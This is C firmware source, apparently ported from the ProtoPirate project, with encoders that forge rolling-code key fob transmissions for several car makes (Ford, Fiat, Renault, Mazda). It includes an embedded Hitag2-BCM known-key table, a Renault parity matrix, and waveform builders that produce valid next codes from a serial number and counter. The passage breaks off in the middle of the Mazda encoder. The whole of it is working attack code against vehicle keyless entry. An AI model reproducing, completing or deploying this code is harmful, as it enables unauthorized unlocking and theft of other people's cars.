/* Port of ford_v2_encoder_emit_burst. */
static size_t ford_v2_enc_emit_burst(LevelDuration* up, size_t i, size_t cap, const uint8_t* k) {
    for(uint16_t p = 0; p < ford_v2_enc_preamble_pairs; p++) {
        i = pp_emit_merge(up, i, cap, false, ford_v2_enc_te_short);
        i = pp_emit_merge(up, i, cap, true, ford_v2_enc_te_short);
    }

    i = pp_emit_merge(up, i, cap, false, ford_v2_enc_sync_lo_us);
    i = pp_emit_merge(up, i, cap, true, ford_v2_enc_te_short);

    for(uint16_t bit_pos = 1U; bit_pos < ford_v2_enc_data_bits; bit_pos++) {
        const uint8_t byte_idx = (uint8_t)(bit_pos / 8U);
        const uint8_t bit_idx = (uint8_t)(7U - (bit_pos % 8U));
        i = ford_v2_enc_emit_bit(up, i, cap, ((k[byte_idx] >> bit_idx) & 1U) != 0U);
    }
    return i;
}

/* Port of ford_v2_encoder_build_upload: 6 bursts with inter-burst gaps. */
static size_t ford_v2_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)data;
    (void)bits;

    size_t i = 0;
    for(uint8_t burst = 0; burst < ford_v2_enc_burst_count; burst++) {
        i = ford_v2_enc_emit_burst(up, i, cap, ford_v2_enc_frame);
        if(burst + 1U < ford_v2_enc_burst_count) {
            i = pp_emit_merge(up, i, cap, true, ford_v2_enc_inter_burst_gap_us);
        }
    }
    return i;
}

static size_t
    ford_v2_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!ford_v2_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return ford_v2_enc_upload(data, bits, up, cap);
}

/* =========================================================================
 * PORTED ENCODERS -- summary
 *
 *   kia_v0_enc_next   is_fsk=true   max cap 1065   rolling-code, no cipher.
 *                     Emits the base 61-bit "KIA" sub-type only (source also
 *                     has Suzuki/Honda/Mitsu selected by a runtime type that
 *                     serial/btn/cnt does not carry). cnt is plaintext + CRC8,
 *                     so build(serial,btn,cnt+1) is a true next-code.
 *
 *   ford_v1_enc_next  is_fsk=true   max cap 1075 (0x433)   rolling-code recon.
 *                     136-bit / 17-byte frame carried in ford_v1_enc_frame;
 *                     out_data = leading 8 bytes. Scramble+CRC16 reproducible,
 *                     no secret key. Limitation: plain9[4] is forced to the
 *                     serial LSB to satisfy the decode-side strict path; a real
 *                     fob may use it as cipher material -- verify vs a capture.
 *                     Only burst 0 is emitted (as in the source).
 *
 *   ford_v2_enc_next  is_fsk=true   max cap 2093 (pre-merge)   rolling-code,
 *                     no CRC/cipher. 104-bit / 13-byte frame carried in
 *                     ford_v2_enc_frame; out_data = leading 8 bytes. tail31
 *                     set to 0. build() returns 0/false for a button outside
 *                     the {0x10,0x11,0x13,0x14,0x15} whitelist. 6 bursts,
 *                     adjacent same-level durations merged via pp_emit_merge.
 *
 * None of the three were stubs: all had a real pp_emit / level_duration
 * waveform builder in the source, so all three produce an encoder.
 * ========================================================================= */


// --- pp_enc_fiatrenmazchr.h ---
/* ===========================================================================
 * pp_enc_fiatrenmazchr.h
 *
 * ProtoPirate encoder (GPLv3)
 *
 * Self-contained ENCODE-path port of the ProtoPirate car-key protocols
 *   - fiat_v1
 *   - renault_v0
 *   - mazda_v0
 *   - chrysler_v0
 *
 * Derived from ProtoPirate (GPLv3):
 *   protopirate/protocols/{fiat_v1,renault_v0,mazda_v0,chrysler_v0}.c
 * Only the `#if PROTOPIRATE_WITH_ENCODER` transmit / next-rolling-code path is
 * ported here (deserialize reconstruction + waveform builder). The decode side
 * lives in a separate shim and is NOT redefined here.
 *
 * This fragment expects the encoder shim (already provided elsewhere) to supply:
 *   typedef struct { bool level; uint32_t duration; } LevelDuration;
 *   LevelDuration level_duration_make(bool, uint32_t);
 *   size_t pp_emit(LevelDuration*, size_t, size_t, bool, uint32_t);
 *   size_t pp_emit_manchester_bit(LevelDuration*, size_t, size_t, bool, uint32_t);
 *   size_t pp_emit_byte_manchester(LevelDuration*, size_t, size_t, uint8_t, uint32_t);
 *   size_t pp_emit_short_pairs(LevelDuration*, size_t, size_t, uint32_t, size_t);
 *   size_t pp_emit_merge(LevelDuration*, size_t, size_t, bool, uint32_t);
 *   pp_reverse_bits8, pp_u64_to_bytes_be, pp_bytes_to_u64_be, bit_read,
 *   DURATION_DIFF, subghz_protocol_blocks_crc8/crc16,
 *   subghz_protocol_blocks_get_parity/parity8, subghz_protocol_blocks_reverse_key.
 *
 * NO #include / NO #pragma once here on purpose: paste into a firmware TU that
 * already pulls in <stdint.h>/<stdbool.h>/<stddef.h>/<string.h> and the shim.
 *
 * Every file-scope symbol is prefixed `<p>_enc_` to avoid colliding with the
 * decode-side const/#define names.
 * ===========================================================================*/

/* ===========================================================================
 * FIAT V1  --  ProtoPirate encoder (GPLv3)
 *   AM / OOK, 104-bit Manchester wire frame (13 bytes), 102 logical bits.
 *   Rolling code = Hitag2-BCM authenticator over serial/button/counter.
 *   Uses ProtoPirate's embedded known-key table (no external key file needed),
 *   defaulting to key index 0. See limitation note at bottom.
 * ===========================================================================*/

#define FIAT_V1_ENC_WIRE_BITS       104U
#define FIAT_V1_ENC_WIRE_BYTES      13U
#define FIAT_V1_ENC_LOGICAL_BITS    102U
#define FIAT_V1_ENC_TE_US           100U   /* variant B short (te_short) */
#define FIAT_V1_ENC_LEAD_US         850U   /* variant B lead */
#define FIAT_V1_ENC_GAP_US          1230U  /* variant B gap */
#define FIAT_V1_ENC_TAIL_BITS       2U
#define FIAT_V1_ENC_UPLOAD_CAPACITY 240U
#define FIAT_V1_ENC_KNOWN_KEY_COUNT 9U
#define FIAT_V1_ENC_DEFAULT_KEY_IDX 0U

static const uint8_t fiat_v1_enc_known_keys[FIAT_V1_ENC_KNOWN_KEY_COUNT][6] = {
    {0xB7U, 0x92U, 0x80U, 0xAEU, 0xCCU, 0x37U},
    {0xD4U, 0x24U, 0x28U, 0xF7U, 0xD9U, 0x66U},
    {0x4DU, 0x34U, 0x3FU, 0xD4U, 0xE7U, 0xB6U},
    {0x6DU, 0x6BU, 0xF2U, 0x1DU, 0x3AU, 0x1AU},
    {0xA3U, 0xF3U, 0xACU, 0xF7U, 0xB9U, 0x10U},
    {0x4DU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0xCDU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0x33U, 0xFAU, 0x2FU, 0xCDU, 0xC3U, 0x3BU},
    {0xF6U, 0x1AU, 0xEFU, 0x9CU, 0xD0U, 0x1BU},
};

/* Static 13-byte wire frame: the 104-bit frame does not fit in a uint64, so
 * fiat_v1_enc_build stashes it here and fiat_v1_enc_upload emits from it. */
static uint8_t fiat_v1_enc_raw[FIAT_V1_ENC_WIRE_BYTES];

static uint8_t fiat_v1_enc_truth(uint32_t table, uint8_t index) {
    return (uint8_t)((table >> index) & 1U);
}

static uint8_t fiat_v1_enc_filter_index(uint8_t a, uint8_t b, uint8_t c, uint8_t d) {
    return (uint8_t)((a << 3U) | (b << 2U) | (c << 1U) | d);
}

static uint8_t fiat_v1_enc_byte_bit(uint8_t byte, uint8_t bit) {
    return (uint8_t)((byte >> bit) & 1U);
}

static uint8_t fiat_v1_enc_bcm_filter(const uint8_t state[6]) {
    uint8_t group = 0U;
    group |= fiat_v1_enc_truth(
        0x2c79U,
        fiat_v1_enc_filter_index(
            fiat_v1_enc_byte_bit(state[0], 1U),
            fiat_v1_enc_byte_bit(state[0], 2U),
            fiat_v1_enc_byte_bit(state[0], 4U),
            fiat_v1_enc_byte_bit(state[0], 5U)));
    group |= (uint8_t)(fiat_v1_enc_truth(
                           0x6671U,
                           fiat_v1_enc_filter_index(
                               fiat_v1_enc_byte_bit(state[1], 0U),
                               fiat_v1_enc_byte_bit(state[1], 1U),
                               fiat_v1_enc_byte_bit(state[1], 3U),
                               fiat_v1_enc_byte_bit(state[1], 7U)))
                       << 1U);
    group |= (uint8_t)(fiat_v1_enc_truth(
                           0x6671U,
                           fiat_v1_enc_filter_index(
                               fiat_v1_enc_byte_bit(state[3], 5U),
                               fiat_v1_enc_byte_bit(state[2], 0U),
                               fiat_v1_enc_byte_bit(state[2], 2U),
                               fiat_v1_enc_byte_bit(state[2], 6U)))
                       << 2U);
    group |= (uint8_t)(fiat_v1_enc_truth(
                           0x6671U,
                           fiat_v1_enc_filter_index(
                               fiat_v1_enc_byte_bit(state[4], 6U),
                               fiat_v1_enc_byte_bit(state[3], 0U),
                               fiat_v1_enc_byte_bit(state[3], 2U),
                               fiat_v1_enc_byte_bit(state[3], 3U)))
                       << 3U);
    group |= (uint8_t)(fiat_v1_enc_truth(
                           0x2c79U,
                           fiat_v1_enc_filter_index(
                               fiat_v1_enc_byte_bit(state[5], 1U),
                               fiat_v1_enc_byte_bit(state[5], 3U),
                               fiat_v1_enc_byte_bit(state[5], 4U),
                               fiat_v1_enc_byte_bit(state[4], 5U)))
                       << 4U);
    return fiat_v1_enc_truth(0x7907287bUL, group);
}

static uint8_t fiat_v1_enc_parity8(uint8_t value) {
    value ^= (uint8_t)(value >> 4U);
    value ^= (uint8_t)(value >> 2U);
    value ^= (uint8_t)(value >> 1U);
    return value & 1U;
}

static uint8_t fiat_v1_enc_bcm_feedback(const uint8_t state[6]) {
    static const uint8_t masks[6] = {0xb3U, 0x80U, 0x83U, 0x22U, 0x00U, 0x73U};
    uint8_t feedback = 0U;
    for(uint8_t i = 0U; i < 6U; i++) {
        feedback ^= fiat_v1_enc_parity8((uint8_t)(state[i] & masks[i]));
    }
    return feedback & 1U;
}

static void fiat_v1_enc_bcm_shift(uint8_t state[6], uint8_t input) {
    for(uint8_t i = 0U; i < 5U; i++) {
        state[i] = (uint8_t)((state[i] << 1U) | (state[i + 1U] >> 7U));
    }
    state[5] = (uint8_t)((state[5] << 1U) | (input & 1U));
}

static uint8_t fiat_v1_enc_input_bit_u32_be(uint32_t value, uint8_t index) {
    return (uint8_t)((value >> (31U - index)) & 1U);
}

static uint8_t fiat_v1_enc_input_bit_bytes_be(const uint8_t* bytes, uint8_t index) {
    return (uint8_t)((bytes[index >> 3U] >> (7U - (index & 7U))) & 1U);
}

static uint32_t fiat_v1_enc_generate_authenticator(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    const uint8_t key[6],
    uint32_t epoch) {
    uint8_t state[6] = {
        (uint8_t)(uid >> 24U),
        (uint8_t)(uid >> 16U),
        (uint8_t)(uid >> 8U),
        (uint8_t)uid,
        key[4],
        key[5],
    };

    const uint32_t iv = ((epoch & 0x3FFFFUL) << 14U) | (((uint32_t)control & 0x03FFUL) << 4U) |
                        ((uint32_t)button & 0x0FUL);

    for(uint8_t i = 0U; i < 32U; i++) {
        const uint8_t input = fiat_v1_enc_input_bit_u32_be(iv, i) ^
                              fiat_v1_enc_input_bit_bytes_be(key, i) ^
                              fiat_v1_enc_bcm_filter(state);
        fiat_v1_enc_bcm_shift(state, input);
    }

    uint32_t authenticator = 0U;
    for(uint8_t i = 0U; i < 32U; i++) {
        authenticator = (authenticator << 1U) | fiat_v1_enc_bcm_filter(state);
        fiat_v1_enc_bcm_shift(state, fiat_v1_enc_bcm_feedback(state));
    }
    return authenticator;
}

static uint8_t fiat_v1_enc_frame_xor(const uint8_t raw[FIAT_V1_ENC_WIRE_BYTES]) {
    uint8_t value = 0x01U;
    for(uint8_t i = 0U; i < FIAT_V1_ENC_WIRE_BYTES - 1U; i++) {
        value ^= raw[i];
    }
    return value;
}

static bool fiat_v1_enc_button_valid(uint8_t button) {
    return button == 0x1U || button == 0x2U || button == 0x4U || button == 0x8U;
}

static void fiat_v1_enc_build_raw(
    uint8_t raw[FIAT_V1_ENC_WIRE_BYTES],
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t auth,
    uint8_t tail_bits) {
    memset(raw, 0, FIAT_V1_ENC_WIRE_BYTES);
    raw[1] = 0x01U;
    raw[2] = (uint8_t)(uid >> 24U);
    raw[3] = (uint8_t)(uid >> 16U);
    raw[4] = (uint8_t)(uid >> 8U);
    raw[5] = (uint8_t)uid;
    raw[6] = (uint8_t)(((button & 0x0FU) << 4U) | ((control >> 6U) & 0x0FU));
    raw[7] = (uint8_t)(((control & 0x3FU) << 2U) | ((auth >> 30U) & 0x03U));
    raw[8] = (uint8_t)(auth >> 22U);
    raw[9] = (uint8_t)(auth >> 14U);
    raw[10] = (uint8_t)(auth >> 6U);
    raw[11] = (uint8_t)((auth << 2U) | (tail_bits & 0x03U));
    raw[12] = fiat_v1_enc_frame_xor(raw);
}

/* Reconstruct the fiat wire frame from serial/btn/cnt using an embedded
 * known key (index FIAT_V1_ENC_DEFAULT_KEY_IDX). out_data/out_bits describe the
 * 102-bit logical value (serial<<32 | authenticator); the full 104-bit wire
 * frame is stashed in fiat_v1_enc_raw for fiat_v1_enc_upload. */
static bool fiat_v1_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    if(serial == 0U || serial == UINT32_MAX) {
        return false;
    }
    if(!fiat_v1_enc_button_valid(btn)) {
        return false;
    }

    const uint16_t control = (uint16_t)(cnt & 0x03FFU);
    const uint8_t* key = fiat_v1_enc_known_keys[FIAT_V1_ENC_DEFAULT_KEY_IDX];
    const uint32_t hop = fiat_v1_enc_generate_authenticator(serial, btn, control, key, 0U);

    fiat_v1_enc_build_raw(fiat_v1_enc_raw, serial, btn, control, hop, FIAT_V1_ENC_TAIL_BITS);

    /* sanity: header + XOR must be consistent */
    if(fiat_v1_enc_raw[0] != 0x00U || fiat_v1_enc_raw[1] != 0x01U ||
       fiat_v1_enc_frame_xor(fiat_v1_enc_raw) != fiat_v1_enc_raw[12]) {
        return false;
    }

    if(out_data) {
        *out_data = ((uint64_t)serial << 32U) | hop;
    }
    if(out_bits) {
        *out_bits = FIAT_V1_ENC_LOGICAL_BITS;
    }
    return true;
}

/* Emit the 104-bit Manchester wire frame (from fiat_v1_enc_raw). data/bits are
 * accepted for signature conformance but the >64-bit frame is read from the
 * static buffer populated by fiat_v1_enc_build. */
static size_t fiat_v1_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)data;
    (void)bits;
    if(!up) {
        return 0U;
    }

    size_t index = 0U;
    index = pp_emit_merge(up, index, cap, true, FIAT_V1_ENC_LEAD_US);

    for(uint8_t bit_index = 0U; bit_index < FIAT_V1_ENC_WIRE_BITS; bit_index++) {
        const bool bit =
            ((fiat_v1_enc_raw[bit_index >> 3U] >> (7U - (bit_index & 7U))) & 1U) != 0U;
        index = pp_emit_merge(up, index, cap, bit, FIAT_V1_ENC_TE_US);
        index = pp_emit_merge(up, index, cap, !bit, FIAT_V1_ENC_TE_US);
    }

    index = pp_emit_merge(up, index, cap, false, FIAT_V1_ENC_GAP_US);
    return (index <= cap) ? index : 0U;
}

static const bool fiat_v1_enc_is_fsk = false; /* AM / OOK */

static size_t fiat_v1_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!fiat_v1_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return fiat_v1_enc_upload(data, bits, up, cap);
}

/* ===========================================================================
 * RENAULT V0  --  ProtoPirate encoder (GPLv3)
 *   AM / OOK, differential-Manchester, 3 bursts. 82 wire bits =
 *   64-bit "data" + 18-bit "key2". Rolling code fully derived from an embedded
 *   parity matrix -- no external/secret key required.
 * ===========================================================================*/

#define RENAULT_V0_ENC_MIN_BITS         82U      /* 0x52 */
#define RENAULT_V0_ENC_UPLOAD_CAPACITY  600U     /* 0x258 */
#define RENAULT_V0_ENC_TE_SHORT_US      125U     /* 0x7D */
#define RENAULT_V0_ENC_TE_LONG_US       250U     /* 0xFA */
#define RENAULT_V0_ENC_PREAMBLE_PAIRS   16U
#define RENAULT_V0_ENC_BURST_COUNT      3U
#define RENAULT_V0_ENC_INTER_BURST_US   25000U   /* 0x61A8 */
#define RENAULT_V0_ENC_FINAL_LOW_US     250U
#define RENAULT_V0_ENC_SYNC_HIGH_US     1000U

typedef struct {
    uint32_t low;
    uint32_t high;
} renault_v0_enc_matrix_row;

static const renault_v0_enc_matrix_row renault_v0_enc_matrix[42] = {
    {0x00000001, 0x00000000}, {0x04000029, 0x00000000}, {0x0000001B, 0x00000000},
    {0x00000000, 0x00000000}, {0x00000001, 0x00000000}, {0x05220124, 0x00000000},
    {0x00000001, 0x00000000}, {0x00088410, 0x00000000}, {0x60132D1D, 0x00000000},
    {0x60170F87, 0x00001004}, {0x00000000, 0x00000000}, {0x002000A9, 0x00000000},
    {0x20863E01, 0x0000100C}, {0x24BB3755, 0x00000004}, {0x640199A4, 0x00000004},
    {0x24225C43, 0x00001004}, {0x607886F1, 0x0000100C}, {0x6007A101, 0x0000000C},
    {0x66672A10, 0x00000004}, {0x4651623F, 0x00001008}, {0x43380BBF, 0x00001008},
    {0x20237F84, 0x00001000}, {0x4245755E, 0x00001008}, {0x60AAF581, 0x00000004},
    {0x22722DAD, 0x0000000C}, {0x27C617F7, 0x00000000}, {0x46DE8F1B, 0x0000000C},
    {0x231DEC51, 0x00000000}, {0x03ACAA0B, 0x00000008}, {0x22D2BF81, 0x00000004},
    {0x626EF6AE, 0x0000100C}, {0x40441F95, 0x0000000C}, {0x00000001, 0x00000000},
    {0x00000000, 0x00000000}, {0x20B9A590, 0x00000008}, {0x656C8E86, 0x00001008},
    {0x60129F96, 0x0000000C}, {0x2368F667, 0x00001000}, {0x442A1A5C, 0x00000000},
    {0x04C43242, 0x0000100C}, {0x22198640, 0x00001000}, {0x23D6B958, 0x00001008},
};

/* 18-bit key2 companion for the 64-bit data word; the 82-bit frame does not fit
 * in a uint64, so renault_v0_enc_build stashes key2 here and _enc_upload reads
 * it alongside the passed 64-bit data. */
static uint32_t renault_v0_enc_key2;

static bool renault_v0_enc_button_valid(uint8_t button) {
    return (button == 0x05U) || (button == 0x06U) || (button == 0x0AU);
}

static void renault_v0_enc_u64_to_bytes_be(uint64_t data, uint8_t bytes[8]) {
    for(size_t j = 0; j < 8; j++) {
        bytes[j] = (uint8_t)((data >> ((7U - j) * 8U)) & 0xFFU);
    }
}

static uint8_t renault_v0_enc_checksum(uint64_t data, uint32_t key2) {
    uint8_t bytes[10];
    renault_v0_enc_u64_to_bytes_be(data, bytes);
    bytes[8] = (uint8_t)((key2 >> 10U) & 0xFFU);
    bytes[9] = (uint8_t)((key2 >> 2U) & 0xFFU);

    uint8_t checksum = 0U;
    for(size_t i = 0; i < 10U; i++) {
        checksum ^= bytes[i];
    }
    return checksum;
}

static void renault_v0_enc_set_split_bit(uint32_t* low, uint32_t* high, uint8_t bit) {
    if(bit < 32U) {
        *low |= (1UL << bit);
    } else {
        *high |= (1UL << (bit - 32U));
    }
}

static uint8_t renault_v0_enc_parity32(uint32_t value) {
    value ^= value >> 16U;
    value ^= value >> 8U;
    value ^= value >> 4U;
    value ^= value >> 2U;
    value ^= value >> 1U;
    return (uint8_t)(value & 1U);
}

static void renault_v0_enc_build_key(
    uint32_t serial,
    uint8_t button,
    uint8_t counter,
    uint64_t* out_data,
    uint32_t* out_key2) {
    uint8_t vars[7];
    uint8_t parity_bits[42];

    vars[0] = (button == 0x0AU) ? 1U : 0U;
    for(uint8_t bit = 0; bit < 6U; bit++) {
        vars[bit + 1U] = (counter >> bit) & 1U;
    }

    uint32_t mask_low = 1U;
    uint32_t mask_high = 0U;
    uint8_t mask_bit = 1U;

    for(uint8_t i = 0; i < 7U; i++, mask_bit++) {
        if(vars[i]) {
            renault_v0_enc_set_split_bit(&mask_low, &mask_high, mask_bit);
        }
    }

    for(uint8_t i = 0; i < 6U; i++) {
        for(uint8_t j = i + 1U; j < 7U; j++, mask_bit++) {
            if(vars[i] & vars[j]) {
                renault_v0_enc_set_split_bit(&mask_low, &mask_high, mask_bit);
            }
        }
    }

    for(uint8_t i = 0; i < 6U; i++) {
        for(uint8_t j = i + 1U; j < 7U; j++) {
            for(uint8_t k = j + 1U; k < 7U; k++, mask_bit++) {
                if(vars[i] & vars[j] & vars[k]) {
                    renault_v0_enc_set_split_bit(&mask_low, &mask_high, mask_bit);
                }
            }
        }
    }

    for(size_t row = 0; row < 42U; row++) {
        const uint32_t mixed = (renault_v0_enc_matrix[row].low & mask_low) ^
                               (renault_v0_enc_matrix[row].high & mask_high);
        parity_bits[row] = renault_v0_enc_parity32(mixed);
    }

    if(counter & 0x40U) {
        parity_bits[41] ^= 1U;
    }
    if((counter >> 7U) != 0U) {
        parity_bits[40] ^= 1U;
    }

    uint32_t data_low = ((uint32_t)counter) << 24U;
    uint32_t data_high = (serial << 8U) | (uint32_t)button;

    for(uint8_t i = 0; i < 24U; i++) {
        if(parity_bits[i]) {
            data_low |= 1UL << (23U - i);
        }
    }

    uint32_t key2 = 0U;
    for(uint8_t i = 24U; i < 42U; i++) {
        if(parity_bits[i]) {
            key2 |= 1UL << (41U - i);
        }
    }

    if(out_data) {
        *out_data = ((uint64_t)data_high << 32U) | data_low;
    }
    if(out_key2) {
        *out_key2 = key2;
    }
}

static bool renault_v0_enc_type13_valid(uint64_t data, uint32_t key2) {
    uint8_t button = (uint8_t)(data >> 32U);
    const uint8_t checksum = renault_v0_enc_checksum(data, key2);
    if((checksum & 0x3FU) != 0x13U) {
        return false;
    }
    if((key2 & 0x03U) != (uint32_t)(checksum >> 6U)) {
        return false;
    }
    return renault_v0_enc_button_valid(button);
}

/* differential-Manchester emit helper mirroring the source's coalescing
 * behaviour; success == entry advanced OR merged into an equal-level entry. */
static bool renault_v0_enc_emit(
    LevelDuration* up,
    size_t cap,
    size_t* index,
    bool level,
    uint32_t duration) {
    const size_t prev = *index;
    *index = pp_emit_merge(up, prev, cap, level, duration);
    if(*index > prev) {
        return true;
    }
    return (prev > 0U) && (up[prev - 1U].level == level);
}

static bool renault_v0_enc_emit_decoded_bit(
    LevelDuration* up,
    size_t cap,
    size_t* index,
    uint8_t* state,
    bool bit) {
    if(*state == 1U) {
        if(bit) {
            return renault_v0_enc_emit(up, cap, index, false, RENAULT_V0_ENC_TE_SHORT_US) &&
                   renault_v0_enc_emit(up, cap, index, true, RENAULT_V0_ENC_TE_SHORT_US);
        }
        *state = 2U;
        return renault_v0_enc_emit(up, cap, index, false, RENAULT_V0_ENC_TE_LONG_US);
    }

    if(bit) {
        *state = 1U;
        return renault_v0_enc_emit(up, cap, index, true, RENAULT_V0_ENC_TE_LONG_US);
    }

    return renault_v0_enc_emit(up, cap, index, true, RENAULT_V0_ENC_TE_SHORT_US) &&
           renault_v0_enc_emit(up, cap, index, false, RENAULT_V0_ENC_TE_SHORT_US);
}

static bool renault_v0_enc_get_bit_msb82(uint64_t data, uint32_t key2, uint8_t bit_index) {
    if(bit_index <= 0x3FU) {
        return ((data >> (63U - bit_index)) & 1ULL) != 0ULL;
    }
    return ((key2 >> (0x51U - bit_index)) & 1U) != 0U;
}

/* Reconstruct the renault frame from serial/btn/cnt. out_data = 64-bit data
 * word, out_bits = 82; the companion 18-bit key2 is stashed in
 * renault_v0_enc_key2 for _enc_upload. */
static bool renault_v0_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    const uint8_t counter = (uint8_t)(cnt & 0xFFU);
    if(!renault_v0_enc_button_valid(btn)) {
        return false;
    }

    uint64_t data = 0ULL;
    uint32_t key2 = 0U;
    renault_v0_enc_build_key(serial, btn, counter, &data, &key2);
    if(!renault_v0_enc_type13_valid(data, key2)) {
        return false;
    }

    renault_v0_enc_key2 = key2;
    if(out_data) {
        *out_data = data;
    }
    if(out_bits) {
        *out_bits = RENAULT_V0_ENC_MIN_BITS;
    }
    return true;
}

static size_t renault_v0_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    if(!up) {
        return 0U;
    }
    const uint32_t key2 = renault_v0_enc_key2;

    size_t write_index = 0U;
    for(uint8_t burst = 0U; burst < RENAULT_V0_ENC_BURST_COUNT; burst++) {
        if(!renault_v0_enc_emit(up, cap, &write_index, true, RENAULT_V0_ENC_SYNC_HIGH_US)) {
            return 0U;
        }

        uint8_t state = 1U;
        for(uint8_t pair = 0U; pair < RENAULT_V0_ENC_PREAMBLE_PAIRS; pair++) {
            if(!renault_v0_enc_emit_decoded_bit(up, cap, &write_index, &state, true)) {
                return 0U;
            }
        }

        for(uint8_t bit_index = 0U; bit_index < RENAULT_V0_ENC_MIN_BITS; bit_index++) {
            const bool bit = renault_v0_enc_get_bit_msb82(data, key2, bit_index);
            if(!renault_v0_enc_emit_decoded_bit(up, cap, &write_index, &state, bit)) {
                return 0U;
            }
        }

        if(state == 2U) {
            if(!renault_v0_enc_emit(up, cap, &write_index, true, RENAULT_V0_ENC_TE_SHORT_US)) {
                return 0U;
            }
        }

        const uint32_t trailing_low = (burst + 1U < RENAULT_V0_ENC_BURST_COUNT) ?
                                          RENAULT_V0_ENC_INTER_BURST_US :
                                          RENAULT_V0_ENC_FINAL_LOW_US;
        if(!renault_v0_enc_emit(up, cap, &write_index, false, trailing_low)) {
            return 0U;
        }
    }

    return write_index;
}

static const bool renault_v0_enc_is_fsk = false; /* AM / OOK (315/433/868) */

static size_t renault_v0_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!renault_v0_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return renault_v0_enc_upload(data, bits, up, cap);
}

/* ===========================================================================
 * MAZDA V0  --  ProtoPirate encoder (GPLv3)
 *   AM / OOK (protocol also flags FM), Manchester bytes. 64-bit key fits
 *   cleanly in a uint64. Rolling code fully derived (checksum + bit-shuffle) --
 *   no external/secret key required.
 * ===========================================================================*/

#define MAZDA_V0_ENC_TE_US           250U
#define MAZDA_V0_ENC_UPLOAD_CAPACITY (((12U + 3U + 8U + 1U) * 16U) + 2U) /* 386 */
#define MAZDA_V0_ENC_GAP_US          0xCB20U
#define MAZDA_V0_ENC_SYNC_BYTE       0xD7U
#define MAZDA_V0_ENC_TAIL_BYTE       0x5AU
#define MAZDA_V0_ENC_MIN_BITS        64U

static uint8_t mazda_v0_enc_calculate_checksum(uint32_t serial, uint8_t button, uint32_t counter) {
    counter &= 0xFFFFFU;
    return (uint8_t)(((serial >> 24) & 0xFF) + ((serial >> 16) & 0xFF) + ((serial >> 8) & 0xFF) +
                     (serial & 0xFF) + ((counter >> 8) & 0xFF) + (counter & 0xFF) +
                     ((((counter >> 16) & 0x0F) | ((button & 0x0F) << 4)) & 0xFF));
}

static uint64_t mazda_v0_enc_encode_key(uint32_t serial, uint8_t button, uint32_t counter) {
    uint8_t data[8];

    counter &= 0xFFFFFU;
    button &= 0x0F;

    data[0] = (serial >> 24) & 0xFF;
    data[1] = (serial >> 16) & 0xFF;
    data[2] = (serial >> 8) & 0xFF;
    data[3] = serial & 0xFF;
    data[4] = (button << 4) | ((counter >> 16) & 0x0F);
    data[5] = (counter >> 8) & 0xFF;
    data[6] = counter & 0xFF;
    data[7] = mazda_v0_enc_calculate_checksum(serial, button, counter);

    const uint8_t stored_5 = (data[6] & 0x55) | (data[5] & 0xAA);
    const uint8_t stored_6 = (data[6] & 0xAA) | (data[5] & 0x55);
    const uint8_t xor_mask = stored_5 ^ stored_6;
    const bool replace_second = subghz_protocol_blocks_parity8(data[7]) == 0;
    const uint8_t forward_mask = replace_second ? stored_5 : stored_6;

    data[5] = replace_second ? stored_5 : xor_mask;
    data[6] = replace_second ? xor_mask : stored_6;

    for(size_t i = 0; i < 5; i++) {
        data[i] ^= forward_mask;
    }

    return pp_bytes_to_u64_be(data);
}

static bool mazda_v0_enc_append_byte(LevelDuration* up, size_t cap, size_t* index, uint8_t value) {
    if(*index + 16U > cap) {
        return false;
    }
    *index = pp_emit_byte_manchester(up, *index, cap, value, MAZDA_V0_ENC_TE_US);
    return true;
}

static bool mazda_v0_enc_add_level(
    LevelDuration* up,
    size_t cap,
    size_t* index,
    bool level,
    uint32_t duration) {
    size_t before = *index;
    *index = pp_emit(up, before, cap, level, duration);
    return *index > before;
}

/* Reconstruct the 64-bit mazda key from serial/btn/cnt. Fits entirely in the
 * uint64 data word (out_bits = 64). No static companion needed. */
static bool mazda_v0_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    const uint8_t button = (uint8_t)(btn & 0x0FU);
    const uint32_t counter = cnt & 0xFFFFFU;

    const uint64_t data = mazda_v0_enc_encode_key(serial, button, counter);
    if(out_data) {
        *out_data = data;
    }
    if(out_bits) {
        *out_bits = MAZDA_V0_ENC_MIN_BITS;
    }
    return true;
}

static size_t mazda_v0_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    if(!up) {
        return 0U;
    }
    const uint64_t key64 = data;
    size_t index = 0U;

    for(size_t r = 0; r < 12; r++) {
        if(!mazda_v0_enc_append_byte(up, cap, &index, 0xFF)) {
            return 0U;
        }
    }

    if(!mazda_v0_enc_add_level(up, cap, &index, false, MAZDA_V0_ENC_GAP_US)) {
        return 0U;
    }

    if(!mazda_v0_enc_append_byte(up, cap, &index, 0xFF) ||
       !mazda_v0_enc_append_byte(up, cap, &index, 0xFF) ||
       !mazda_v0_enc_append_byte(up, cap, &index, MAZDA_V0_ENC_SYNC_BYTE)) {
        return 0U;
    }

    for(int bi = 0; bi < 8; bi++) {
        const uint8_t raw = (uint8_t)((key64 >> (56 - bi * 8)) & 0xFF);
        const uint8_t air = (uint8_t)~raw;
